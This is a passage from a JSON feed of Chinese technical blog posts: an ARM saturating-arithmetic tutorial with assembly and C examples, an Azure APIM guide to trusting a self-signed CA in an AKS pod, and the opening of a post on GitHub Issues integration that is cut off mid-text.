      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/lsksp/p/19524284\" id=\"cb_post_title_url\" title=\"发布于 2026-01-23 23:56\">\n    <span>ARM Q 饱和运算快速入门指南</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                    <div id=\"cnblogs_post_description\" style=\"display: none;\">\n        \n        在 ARM 嵌入式开发（尤其是信号处理、音视频编解码、传感器数据处理）中，普通算术运算的 “数值回绕” 问题极易导致数据错误，而**Q 饱和运算**是解决该问题的核心方案。\n    </div>\n<div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<p>在 ARM 嵌入式开发（尤其是信号处理、音视频编解码、传感器数据处理）中，普通算术运算的 “数值回绕” 问题极易导致数据错误，而<strong>Q 饱和运算</strong>是解决该问题的核心方案。</p>\n<h2 id=\"一什么是-q-饱和运算\">一、什么是 Q 饱和运算？</h2>\n<h3 id=\"1-核心痛点普通运算的-数值回绕\">1. 核心痛点：普通运算的 “数值回绕”</h3>\n<p>普通算术运算（如 ADD/SUB）溢出时，数值会按补码规则 “回绕”，导致结果完全错误：</p>\n<ul>\n<li>示例：<code>int8_t</code> 类型最大值 <code>127 + 1</code> → 结果变成 <code>-128</code>（而非预期的 127）；</li>\n<li>示例：<code>int8_t</code> 类型最小值 <code>-128 - 1</code> → 结果变成 <code>127</code>。</li>\n</ul>\n<h3 id=\"2-q-饱和运算的本质\">2. Q 饱和运算的本质</h3>\n<p>Q 饱和运算（Saturating Arithmetic）是 ARM 指令集中带 <code>Q</code> 前缀的特殊运算，核心逻辑：</p>\n<ul>\n<li>运算结果超出目标数据类型的<strong>数值范围（上限 / 下限）</strong> 时，结果被 “钳位” 到该类型的极值；</li>\n<li>同时置位 APSR 寄存器的 Q 标志位（溢出标记）。</li>\n</ul>\n<h2 id=\"二核心基础apsr-的-q-标志位\">二、核心基础：APSR 的 Q 标志位</h2>\n<p>Q 饱和运算的 “溢出标记” 依赖 APSR（应用程序状态寄存器）的 Q 位，这是使用饱和运算的核心要点：</p>\n<h3 id=\"1-q-标志位关键属性\">1. Q 标志位关键属性</h3>\n<table>\n<thead>\n<tr>\n<th style=\"text-align: center;\">特性</th>\n<th style=\"text-align: center;\">说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align: center;\">位位置</td>\n<td style=\"text-align: center;\">APSR 的 Bit 27（唯一标识位）</td>\n</tr>\n<tr>\n<td style=\"text-align: center;\">触发条件</td>\n<td style=\"text-align: center;\">仅当 <code>Q</code> 前缀的饱和运算指令溢出时置 1，普通运算溢出不触发</td>\n</tr>\n<tr>\n<td style=\"text-align: center;\">粘性位特性</td>\n<td style=\"text-align: center;\">一旦置 1，不会自动清零，必须通过显式指令 / 代码清除，否则会持续标记溢出</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"2-饱和运算的-上下限触发阈值\">2. 饱和运算的 “上下限”（触发阈值）</h3>\n<p>Q 位触发的本质是运算结果超出目标数据类型的数值范围：</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align: center;\">数据类型</th>\n<th style=\"text-align: center;\">符号性</th>\n<th style=\"text-align: center;\">下限</th>\n<th style=\"text-align: center;\">上限</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align: center;\">8 位整数</td>\n<td style=\"text-align: center;\">有符号</td>\n<td style=\"text-align: center;\">-128</td>\n<td style=\"text-align: center;\">127</td>\n</tr>\n<tr>\n<td style=\"text-align: center;\">8 位整数</td>\n<td style=\"text-align: center;\">无符号</td>\n<td style=\"text-align: center;\">0</td>\n<td style=\"text-align: center;\">255</td>\n</tr>\n<tr>\n<td style=\"text-align: center;\">16 位整数</td>\n<td style=\"text-align: center;\">有符号</td>\n<td style=\"text-align: center;\">-32768</td>\n<td style=\"text-align: center;\">32767</td>\n</tr>\n<tr>\n<td style=\"text-align: center;\">32 位整数</td>\n<td style=\"text-align: center;\">有符号</td>\n<td style=\"text-align: center;\">-2147483648</td>\n<td style=\"text-align: center;\">2147483647</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"三核心用法饱和运算指令--函数\">三、核心用法：饱和运算指令 / 函数</h2>\n<h3 id=\"1-汇编层面直接操作深入底层\">1. 汇编层面（直接操作，深入底层）</h3>\n<p>ARM 提供了一系列带 <code>Q</code> 前缀的饱和运算指令，入门常用指令如下：</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align: center;\">指令</th>\n<th style=\"text-align: center;\">功能</th>\n<th style=\"text-align: center;\">适用场景</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align: center;\">QADD/QSUB</td>\n<td style=\"text-align: center;\">32 位有符号数饱和加 / 减</td>\n<td style=\"text-align: center;\">32 位整型数据运算</td>\n</tr>\n<tr>\n<td style=\"text-align: center;\">UQADD8</td>\n<td style=\"text-align: center;\">无符号 8 位按字节饱和加法</td>\n<td style=\"text-align: center;\">多字节无符号数据（如 RGB）</td>\n</tr>\n<tr>\n<td style=\"text-align: center;\">SQXTB</td>\n<td style=\"text-align: center;\">32 位→8 位有符号饱和转换</td>\n<td style=\"text-align: center;\">数据类型降位（如 32→8 位）</td>\n</tr>\n<tr>\n<td style=\"text-align: center;\">UQXTB</td>\n<td style=\"text-align: center;\">32 位→8 位无符号饱和转换</td>\n<td style=\"text-align: center;\">无符号数据降位</td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"汇编示例32-位有符号饱和加法溢出场景\">汇编示例：32 位有符号饱和加法（溢出场景）</h4>\n<pre><code class=\"language-assembly\">; 目标：计算int32_t上限值+1，验证饱和效果\nMOV R0, #2147483647   ; R0 = int32_t上限值\nMOV R1, #1            ; 加1，超出上限\nQADD R2, R0, R1       ; 饱和加法：R2被钳位到2147483647，Q位置1\n\n; 检测Q标志位\nMRS R3, APSR          ; 读取APSR到R3\nTST R3, #(1&lt;&lt;27)      ; 检测Bit27（Q位）\nBNE overflow_handle   ; Q=1则跳转到溢出处理\n\noverflow_handle:\nMSR APSR_nzcvq, #0    ; 显式清除Q位（关键：避免后续误判）\n</code></pre>\n<h3 id=\"2-c-语言层面快速入门推荐\">2. C 语言层面（快速入门，推荐）</h3>\n<p>ARM GCC 编译器提供内置函数，无需手写汇编，底层自动生成 Q 前缀指令，入门必用函数如下：</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align: center;\">函数名</th>\n<th style=\"text-align: center;\">功能</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align: center;\"><code>__qadd(a, b)</code></td>\n<td style=\"text-align: center;\">32 位有符号饱和加法</td>\n</tr>\n<tr>\n<td style=\"text-align: center;\"><code>__qsub(a, b)</code></td>\n<td style=\"text-align: center;\">32 位有符号饱和减法</td>\n</tr>\n<tr>\n<td style=\"text-align: center;\"><code>__sqxtb(a)</code></td>\n<td style=\"text-align: center;\">32 位→8 位有符号饱和转换</td>\n</tr>\n<tr>\n<td style=\"text-align: center;\"><code>__uqxtb(a)</code></td>\n<td style=\"text-align: center;\">32 位→8 位无符号饱和转换</td>\n</tr>\n<tr>\n<td style=\"text-align: center;\">__SSAT(x, sat)</td>\n<td style=\"text-align: center;\">有符号数饱和至 <code>sat</code> 位</td>\n</tr>\n<tr>\n<td style=\"text-align: center;\">__USAT(x, sat)</td>\n<td style=\"text-align: center;\">无符号数饱和至 <code>sat</code> 位</td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"c-语言完整示例含-q-位检测--清除\">C 语言完整示例（含 Q 位检测 / 清除）</h4>\n<pre><code class=\"language-C\">#include &lt;stdint.h&gt;\n#include &lt;stdio.h&gt;\n\n// 读取APSR寄存器，检测Q标志位\nstatic inline uint32_t get_apsr(void) {\n    uint32_t apsr;\n    __asm__ volatile (\"mrs %0, apsr\" : \"=r\" (apsr));\n    return apsr;\n}\n\n// 判断Q位是否置1（溢出）\nstatic inline int is_q_flag_set(void) {\n    return (get_apsr() &amp; (1U &lt;&lt; 27)) != 0;\n}\n\n// 清除Q标志位\nstatic inline void clear_q_flag(void) {\n    __asm__ volatile (\"msr apsr_nzcvq, #0\");\n}\n\nint main(void) {\n    // 示例：限幅\n  \tint32_t pid_output = 50000; // 计算结果超出了16位变量范围\n    // 将结果饱和限制在 16 位有符号数范围内 (-32768 ~ 32767)\n\tint16_t motor_output = (int16_t)__SSAT(pid_output, 16);  \n    \n    // 示例：32位有符号饱和加法（超出上限）\n    int32_t a = 2147483647; // int32_t上限\n    int32_t b = 1;\n    int32_t res1 = __qadd(a, b); // 饱和加法：结果钳位到2147483647\n    printf(\"32位饱和加法结果：%d（预期：2147483647）\\n\", res1);\n    printf(\"Q位状态：%s\\n\", is_q_flag_set() ? \"溢出（置1）\" : \"未溢出（置0）\");\n    clear_q_flag(); // 清除Q位\n    \n    return 0;\n}\n</code></pre>\n<h4 id=\"手动实现饱和运算兼容非-arm-gcc-场景\">手动实现饱和运算（兼容非 ARM GCC 场景）</h4>\n<p>若编译器不支持内置函数，可手动判断范围实现简易饱和逻辑：</p>\n<pre><code class=\"language-c\">// 8位有符号数饱和加法\nint8_t sat_add_int8(int8_t a, int8_t b) {\n    int16_t temp = (int16_t)a + (int16_t)b; // 用16位避免中间溢出\n    if (temp &gt; 127) return 127;   // 上限钳位\n    if (temp &lt; -128) return -128; // 下限钳位\n    return (int8_t)temp;\n}\n</code></pre>\n<h2 id=\"四总结\">四、总结</h2>\n<ol>\n<li>Q 饱和运算的核心是<strong>溢出时钳位到数据类型极值 + 置位 Q 标志位</strong>，解决普通运算的 “数值回绕” 问题；</li>\n<li>优先使用 ARM GCC 内置函数（如<code>__qadd</code>），深入调试可通过汇编操作 Q 位，检测溢出需读取 APSR 的 Bit27；</li>\n<li>关键注意点：Q 位需手动清除、指令 / 函数匹配数据类型，避免误判和结果错误。</li>\n</ol>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-23 23:56</span>&nbsp;\n<a href=\"https://www.cnblogs.com/lsksp\">比特向阳</a>&nbsp;\n阅读(<span id=\"post_view_count\">0</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "【Azure APIM】APIM的自建网关如何解决自签名证书的受信任问题呢？(方案三)",
      "link": "https://www.cnblogs.com/lulight/p/19523829",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/lulight/p/19523829\" id=\"cb_post_title_url\" title=\"发布于 2026-01-23 19:12\">\n    <span>【Azure APIM】APIM的自建网关如何解决自签名证书的受信任问题呢？(方案三)</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body blogpost-body-html\" id=\"cnblogs_post_body\">\n<h1>问题描述</h1>\n<p>在先前的四篇博文</p>\n<p>1：<a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/lulight/p/19514101\" id=\"cb_post_title_url\" title=\"发布于 2026-01-21 21:19\">【Azure APIM】APIM的自建网关如何解决自签名证书的受信任问题呢？(方案二)</a>&nbsp;</p>\n<p>2：<a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/lulight/p/19503730\" id=\"cb_post_title_url\" target=\"_blank\" title=\"发布于 2026-01-19 21:09\">【Azure APIM】APIM的自建网关如何解决自签名证书的受信任问题呢？(方案一)&nbsp;</a>&nbsp;</p>\n<p>3：<a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/lulight/p/19495544\" id=\"cb_post_title_url\" target=\"_blank\" title=\"发布于 2026-01-17 11:54\">【Azure APIM】如何解决后端API服务配置自签名证书时APIM请求报错500：Error occured while calling backend service</a>&nbsp;</p>\n<p>4：<a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/lulight/p/19479238\" id=\"cb_post_title_url\" target=\"_blank\" title=\"发布于 2026-01-13 21:08\">【Azure 环境】在Windows环境中使用OpenSSL生成自签名证书链步骤分享</a></p>\n<p>我们分别介绍了使用OpenSSL生成自签名证书，然后解决APIM服务对自签名证书的信任问题。不论是APIM托管的网关，还是自建的网关都可以通过安装证书后使得请求受信任，通过配置API跳过证书验证环节。</p>\n<p>本文这从“自建网关本身AKS POD” 方面入手，通过配置 SSL_CERT_FILE 环境变量，来安装自签名证书 （根证书和中间证书）到POD中。</p>\n<p>经过AI大模型解答，在&nbsp;AKS (Azure Kubernetes Service) 中访问使用自签名证书的 API，关键在于让客户端信任该证书，主要的思路是：</p>\n<ol>\n<li>创建包含 CA 证书的 Secret</li>\n<li>将自签名的 CA 证书文件 (例如 ca.crt) 导入到 AKS 集群</li>\n<li>在应用部署的 YAML 文件中，将该 Secret 挂载到容器内，并设置 SSL_CERT_FILE 环境变量指向该证书</li>\n</ol>\n<p><img alt=\"image\" class=\"lazyload\" height=\"703\" width=\"999\" /></p>\n<h1>操作步骤</h1>\n<h2>第一步：准备好中间证书和根证书合并一起的 .crt 内容</h2>\n<div>导出方法：通过浏览器导出中间证书+根证书的 crt 文件，其内容是 Base64 编码</div>\n<p><img alt=\"image\" class=\"lazyload\" height=\"433\" width=\"999\" /></p>\n<p>&nbsp;</p>\n<h2>第二步：创建Kubernetes Secret</h2>\n<p>将自签名的 CA 证书文件 (例如 my-inetr-ca.crt) 导入到 AKS 集群中：</p>\n<p>命令：</p>\n<blockquote>kubectl create secret generic self-signed-ca --from-file=\"&lt;the full path of my-inetr-ca.crt&gt;\"</blockquote>\n<p>结果：</p>\n<p><img alt=\"image\" class=\"lazyload\" height=\"129\" width=\"999\" /></p>\n<p>&nbsp;</p>\n<h2>第三步：在APIM的自建网关Pod中挂载证书</h2>\n<p>在应用部署的 YAML 文件中，将该 Secret 挂载到容器内，并设置 SSL_CERT_FILE 环境变量指向该证书</p>\n<div class=\"cnblogs_code\">\n<pre><span style=\"color: rgba(0, 0, 0, 1);\">...\n\n        volumeMounts:\n        - name: ca-volume\n          mountPath: /etc/ssl/certs/my-ca.crt\n          subPath: my-inetr-ca.crt\n        env:\n        - name: SSL_CERT_FILE\n          value: /etc/ssl/certs/my-ca.crt\n  ... \n      volumes:\n      - name: ca-volume\n        secret:\n          secretName: self-signed-ca\n\n...</span></pre>\n</div>\n<p>把从APIM获取的部署yaml内容，只修改如图中的三个位置，即可。</p>\n<p><img alt=\"image\" class=\"lazyload\" height=\"1516\" width=\"999\" /></p>\n<h2>第四步：部署以上配置，后访问AKS Service External URL进行测试验证</h2>\n<div>\n<blockquote>\n<div># 部署</div>\n<div>kubectl apply -f \"&lt;apim self-hosted gateway yaml file&gt;\"</div>\n<div>#获取对外暴露的IP地址</div>\n<div>kubectl get services</div>\n<div>&nbsp;</div>\n<div>##测试访问自建网关中的API</div>\n<div>curl https://&lt;external ip&gt;/api -k&nbsp;</div>\n</blockquote>\n<div>测试结果，成功通过证书验证及获取正确的结果：</div>\n</div>\n<p><img alt=\"image\" class=\"lazyload\" height=\"426\" width=\"666\" /></p>\n<p>&nbsp;</p>\n<p>如果没有配置SSL_CERT_FILE 及挂载证书，就会遇见500&nbsp;Internal server error。如果进一步通过 kubectl logs &lt;pod name&gt; 查看GatewayLogs日志，就会发现详细错误：The remote certificate was rejected by the provided RemoteCertificateValidationCallback.</p>\n<h2>详细错误</h2>\n<div class=\"cnblogs_Highlighter\">\n<pre class=\"brush:csharp;collapse:true;;gutter:true;\">[Info] 2026-01-23T07:26:27.251 [DnsResolutionScheduled], message: xselfca02.myxxxxx.com, source: RoundRobinNameResolver\n[Info] 2026-01-23T07:26:27.252 [OutgoingTlsProtocolsSet], message: Tls, Tls11, Tls12, source: TcpChannelFactory\n[Info] 2026-01-23T07:26:27.598 [CertificateInfoVerificationScheduled], message: thumbprint: 62BF1CFA2116828E3F0B3C7D8FB4C380CD2CE358, subjectName: CN=*.myxxxxx.com, O=My Self Server Org, S=Chongqing, C=CN (CRL URLs: ; AIA URLs: )\n[Warn] 2026-01-23T07:26:27.601 [FailedToProcessRequest], ActivityId: d5d383dc-c395-4111-8558-2193f9bbb8ff, correlationId: d5d383dc-c395-4111-8558-2193f9bbb8ff, apiId: 69303f7730caebcf2a534309, operationId: get-home-page, tags: 20, httpMethod: GET, source: request-forwarder, serviceName: apim-gateway, exception: System.Security.Authentication.AuthenticationException: The remote certificate was rejected by the provided RemoteCertificateValidationCallback.\nat System.Net.Security.SslStream.SendAuthResetSignal(ReadOnlySpan`1 alert, ExceptionDispatchInfo exception)\nat System.Net.Security.SslStream.CompleteHandshake(SslAuthenticationOptions sslAuthenticationOptions)\nat System.Net.Security.SslStream.ForceAuthenticationAsync[TIOAdapter](Boolean receiveFirst, Byte[] reAuthenticationData, CancellationToken cancellationToken)\nat Gateway.Http.Client.DotNetty.TcpChannelFactory.CreateChannelAsync(IPEndPoint endpoint, RequestedApplicationProtocol requestedApplicationProtocol, TlsInfo tlsMetadata, HttpProxy httpProxyMetadata, Int32 destinationPort, CancellationToken cancellationToken) in C:\\__w\\1\\s\\Proxy\\Gateway.Http.Client.DotNetty\\TcpChannelFactory.cs:line 116\nat Gateway.Http.Client.DotNetty.EndpointPool.CreateAsyncInternal(IPipelineContext pipelineContext, ChannelPoolKey channelPoolKey, RequestedApplicationProtocol requestedApplicationProtocol, CancellationToken cancellationToken, GateInfo gateInfo) in C:\\__w\\1\\s\\Proxy\\Gateway.Http.Client.DotNetty\\EndpointPool.cs:line 307\nat Gateway.Http.Client.DotNetty.EndpointPool.CreateAsync(IPipelineContext pipelineContext, ChannelPoolKey channelPoolKey, RequestedApplicationProtocol requestedApplicationProtocol, CancellationToken cancellationToken) in C:\\__w\\1\\s\\Proxy\\Gateway.Http.Client.DotNetty\\EndpointPool.cs:line 128\nat Gateway.Http.Client.DotNetty.SingleThreadedBackendChannelPool.AcquireAsync(IPipelineContext context, CancellationToken cancellationToken) in C:\\__w\\1\\s\\Proxy\\Gateway.Http.Client.DotNetty\\SingleThreadedBackendChannelPool.cs:line 189\nat Gateway.Http.Client.DotNetty.RoundRobinBackendChannelPool.Acquire0(Object state) in C:\\__w\\1\\s\\Proxy\\Gateway.Http.Client.DotNetty\\RoundRobinBackendChannelPool.cs:line 73\nat Gateway.Http.Client.DotNetty.DotNettyHttpBackend.AcquireChannelAsync(IPipelineContext ctx, CancellationToken cancellationToken) in C:\\__w\\1\\s\\Proxy\\Gateway.Http.Client.DotNetty\\DotNettyHttpBackend.cs:line 791\nat Gateway.Http.Client.DotNetty.DotNettyHttpBackend.ProcessAsync(IPipelineContext context, CancellationToken cancellation) in C:\\__w\\1\\s\\Proxy\\Gateway.Http.Client.DotNetty\\DotNettyHttpBackend.cs:line 172\nat Microsoft.WindowsAzure.ApiManagement.Proxy.Gateway.Policies.PipelineWalker.ExecuteAsync(IPipelineContext context, IEnumerable`1 steps, CancellationToken cancellation) in C:\\__w\\1\\s\\Proxy\\Gateway.Pipeline\\PipelineWalker.cs:line 66\nat Microsoft.WindowsAzure.ApiManagement.Proxy.Gateway.ChildPipeline.ExecuteAsync(IPipelineContext context, CancellationToken cancellationToken) in C:\\__w\\1\\s\\Proxy\\Gateway.Pipeline\\ChildPipeline.cs:line 35\nat Gateway.Pipeline.Extensions.ValueTaskExtensions.Await[T](ValueTask`1 input) in C:\\__w\\1\\s\\Proxy\\Gateway.Pipeline\\Extensions\\ValueTaskExtensions.cs:line 28\nat Microsoft.WindowsAzure.ApiManagement.Proxy.Gateway.Policies.IO.CallServiceHandler.ProcessAsync(IPipelineContext context, CancellationToken cancellation) in C:\\__w\\1\\s\\Proxy\\Gateway.Policies.General\\IO\\CallServiceHandler.cs:line 94\nat Gateway.Http.Client.DotNetty.SingleThreadedBackendChannelPool.AcquireAsync(IPipelineContext context, CancellationToken cancellationToken) in C:\\__w\\1\\s\\Proxy\\Gateway.Http.Client.DotNetty\\SingleThreadedBackendChannelPool.cs:line 189\nat Gateway.Http.Client.DotNetty.RoundRobinBackendChannelPool.Acquire0(Object state) in C:\\__w\\1\\s\\Proxy\\Gateway.Http.Client.DotNetty\\RoundRobinBackendChannelPool.cs:line 73\nat Gateway.Http.Client.DotNetty.DotNettyHttpBackend.AcquireChannelAsync(IPipelineContext ctx, CancellationToken cancellationToken) in C:\\__w\\1\\s\\Proxy\\Gateway.Http.Client.DotNetty\\DotNettyHttpBackend.cs:line 791\nat Gateway.Http.Client.DotNetty.DotNettyHttpBackend.ProcessAsync(IPipelineContext context, CancellationToken cancellation) in C:\\__w\\1\\s\\Proxy\\Gateway.Http.Client.DotNetty\\DotNettyHttpBackend.cs:line 172\nat Microsoft.WindowsAzure.ApiManagement.Proxy.Gateway.Policies.PipelineWalker.ExecuteAsync(IPipelineContext context, IEnumerable`1 steps, CancellationToken cancellation) in C:\\__w\\1\\s\\Proxy\\Gateway.Pipeline\\PipelineWalker.cs:line 66\nat Microsoft.WindowsAzure.ApiManagement.Proxy.Gateway.ChildPipeline.ExecuteAsync(IPipelineContext context, CancellationToken cancellationToken) in C:\\__w\\1\\s\\Proxy\\Gateway.Pipeline\\ChildPipeline.cs:line 35\nat Gateway.Pipeline.Extensions.ValueTaskExtensions.Await[T](ValueTask`1 input) in C:\\__w\\1\\s\\Proxy\\Gateway.Pipeline\\Extensions\\ValueTaskExtensions.cs:line 28\nat Microsoft.WindowsAzure.ApiManagement.Proxy.Gateway.Policies.IO.CallServiceHandler.ProcessAsync(IPipelineContext context, CancellationToken cancellation) in C:\\__w\\1\\s\\Proxy\\Gateway.Policies.General\\IO\\CallServiceHandler.cs:line 94\nat Microsoft.WindowsAzure.ApiManagement.Proxy.Gateway.Policies.PipelineWalker.ExecuteAsync(IPipelineContext context, IEnumerable`1 steps, CancellationToken cancellation) in C:\\__w\\1\\s\\Proxy\\Gateway.Pipeline\\PipelineWalker.cs:line 66\nat Microsoft.WindowsAzure.ApiManagement.Proxy.Gateway.ChildPipeline.ExecuteAsync(IPipelineContext context, CancellationToken cancellationToken) in C:\\__w\\1\\s\\Proxy\\Gateway.Pipeline\\ChildPipeline.cs:line 35\nat Gateway.Pipeline.Extensions.ValueTaskExtensions.Await[T](ValueTask`1 input) in C:\\__w\\1\\s\\Proxy\\Gateway.Pipeline\\Extensions\\ValueTaskExtensions.cs:line 28\nat Microsoft.WindowsAzure.ApiManagement.Proxy.Gateway.Policies.PipelineWalker.ExecuteAsync(IPipelineContext context, IEnumerable`1 steps, CancellationToken cancellation) in C:\\__w\\1\\s\\Proxy\\Gateway.Pipeline\\PipelineWalker.cs:line 66\nat Microsoft.WindowsAzure.ApiManagement.Proxy.Gateway.PipelineExecutor.ExecuteAsync(IPipelineContext context, CancellationToken cancellationToken) in C:\\__w\\1\\s\\Proxy\\Gateway.Pipeline\\PipelineExecutor.cs:line 215, transportError: 0, httpError: 0\n[Info] 2026-01-23T07:26:26.678 [GatewayLogs], correlationId: x-x-x-x, isRequestSuccess: false, totalTime: 922, category: \"GatewayLogs\", callerIpAddress: \"x.x.x.x\", timeGenerated: 2026-01-23T07:26:26.678, region: \"aks\", correlationId: \"x-x-x-x-x\", method: \"GET\", url: \"https://x.x.x.x/xselfca\", responseCode: 500, responseSize: 259, cache: \"none\", backendTime: 920, apiId: \"XXXXXXXXXXXXXXXXXXX\", operationId: \"get-home-page\", clientProtocol: \"HTTP/1.1\", apiRevision: \"1\", clientTlsVersion: \"1.3\", backendMethod: \"GET\", backendUrl: \"https://xxx.xxx.com/\", lastError: {\"elapsed\":921,\"source\":\"request-forwarder\",\"path\":\"forward-request\\\\forward-request\",\"reason\":\"BackendConnectionFailure\",\"message\":\"The remote certificate was rejected by the provided RemoteCertificateValidationCallback.\",\"section\":\"backend\"}, errors: [{\"elapsed\":921,\"source\":\"request-forwarder\",\"path\":\"forward-request\\\\forward-request\",\"reason\":\"BackendConnectionFailure\",\"message\":\"The remote certificate was rejected by the provided RemoteCertificateValidationCallback.\",\"section\":\"backend\"}]\n[Info] 2026-01-23T07:27:22.895 [InitialDnsNeighborDiscoverySucceeded], message: Successfully resolved IP addresses for DNS name xnewcstest-instance-discovery: 10.244.1.11, source: Neighborhood\n\n \n</pre>\n</div>\n<p>&nbsp;</p>\n<h1>参考资料</h1>\n<p id=\"use-custom-certificate-authorities-cas-in-azure-kubernetes-service-aks\">Use custom certificate authorities (CAs) in Azure Kubernetes Service (AKS) :&nbsp;<a href=\"https://learn.microsoft.com/en-us/azure/aks/custom-certificate-authority\" rel=\"noopener nofollow\" target=\"_blank\">https://learn.microsoft.com/en-us/azure/aks/custom-certificate-authority</a></p>\n<p>&nbsp;</p>\n</div>\n<div id=\"MySignature\">\n    <div style=\"background: #1c5f55; height: 36px; width: 618px; padding: 14px 5px 0px 3px;\">\n  <p style=\"font-weight: bold; color: white;\">当在复杂的环境中面临问题，格物之道需：浊而静之徐清，安以动之徐生。 云中，恰是如此!</p>\n</div>\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-23 19:12</span>&nbsp;\n<a href=\"https://www.cnblogs.com/lulight\">编码者卢布</a>&nbsp;\n阅读(<span id=\"post_view_count\">19</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "GitHub Issues 集成",
      "link": "https://www.cnblogs.com/newbe36524/p/19522793",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/newbe36524/p/19522793\" id=\"cb_post_title_url\" title=\"发布于 2026-01-23 15:54\">\n    <span>GitHub Issues 集成</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h1 id=\"从零构建-github-issues-集成hagicode-的前端直连实践\">从零构建 GitHub Issues 集成：HagiCode 的前端直连实践</h1>\n<blockquote>\n<p>本文记录了在 HagiCode 平台中集成 GitHub Issues 的全过程。我们将探讨如何通过\"前端直连 + 后端最小化\"的架构，在保持后端轻量的同时，实现安全的 OAuth 认证与高效的 Issues 同步。</p>\n</blockquote>\n<h2 id=\"背景为什么要集成-github\">背景：为什么要集成 GitHub？</h2>\n<p>HagiCode 作为一个 AI 辅助开发平台，核心价值在于连接想法与实现。但在实际使用中，我们发现用户在 HagiCode 中完成了 Proposal（提案）后，往往需要手动将内容复制到 GitHub Issues 中进行项目跟踪。</p>\n<p>这带来了几个明显的痛点：</p>\n<ol>\n<li><strong>工作流割裂</strong>：用户需要在两个系统之间来回切换，体验不仅不流畅，还容易导致关键信息在复制粘贴的过程中丢失。</li>\n<li><strong>协作不便</strong>：团队其他成员习惯在 GitHub 上查看任务，无法直接看到 HagiCode 中的提案进展。</li>\n<li><strong>重复劳动</strong>：每当提案更新，就要人工去 GitHub 更新对应的 Issue，增加不必要的维护成本。</li>\n</ol>\n<p>为了解决这个问题，我们决定引入 <strong>GitHub Issues Integration</strong> 功能，打通 HagiCode 会话与 GitHub 仓库的连接，实现\"一键同步\"。</p>\n<h2 id=\"关于-hagicode\">关于 HagiCode</h2>\n<blockquote>\n<p>嘿，介绍一下我们正在做的东西</p>\n</blockquote>\n<p>我们正在开发 <strong>HagiCode</strong> —— 一款 AI 驱动的代码智能助手，让开发体验变得更智能、更便捷、更有趣。</p>\n<p><strong>智能</strong> —— AI 全程辅助，从想法到代码，让编码效率提升数倍。<strong>便捷</strong> —— 多线程并发操作，充分利用资源，开发流程顺畅无阻。<strong>有趣</strong> —— 游戏化机制和成就系统，让编码不再枯燥，充满成就感。</p>\n<p>项目正在快速迭代中，如果你对技术写作、知识管理或者 AI 辅助开发感兴趣，欢迎来 <a href=\"https://github.com/HagiCode-org/site\" rel=\"noopener nofollow\" target=\"_blank\">GitHub</a> 看看～</p>\n<hr />\n<h2 id=\"技术选型前端直连-vs-后端代理\">技术选型：前端直连 vs 后端代理</h2>\n<p>在设计集成方案时，摆在我们面前的有两条路：传统的\"后端代理模式\"和更激进的\"前端直连模式\"。</p>\n<h3 id=\"方案对比\">方案对比</h3>\n<p>在传统的<strong>后端代理模式</strong>中，前端所有的请求都要先经过我们的后端，再由后端去调用 GitHub API。这虽然逻辑集中，但给后端带来了不小的负担：</p>\n<ol>\n<li><strong>后端臃肿</strong>：需要编写专门的 GitHub API 客户端封装，还要处理 OAuth 的复杂状态机。</li>\n<li><strong>Token 风险</strong>：用户的 GitHub Token 必须存储在后端数据库中，虽然可以加密，但毕竟增加了安全风险面。</li>\n<li><strong>开发成本</strong>：需要数据库迁移来存储 Token，还需要维护一套额外的同步服务。</li>\n</ol>\n<p>而<strong>前端直连模式</strong>则要轻量得多。在这个方案中，我们只利用后端来处理最敏感的\"密钥交换\"环节（OAuth callback），获取到 Token 后，直接存在浏览器的 localStorage 里。后续创建 Issue、更新评论等操作，直接由前端发 HTTP 请求到 GitHub。</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align: left;\">对比维度</th>\n<th style=\"text-align: left;\">后端代理模式</th>\n<th style=\"text-align: left;\">前端直连模式</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align: left;\"><strong>后端复杂度</strong></td>\n<td style=\"text-align: left;\">需要完整的 OAuth 服务和 GitHub API 客户端</td>\n<td style=\"text-align: left;\">仅需一个 OAuth 回调端点</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\"><strong>Token 管理</strong></td>\n<td style=\"text-align: 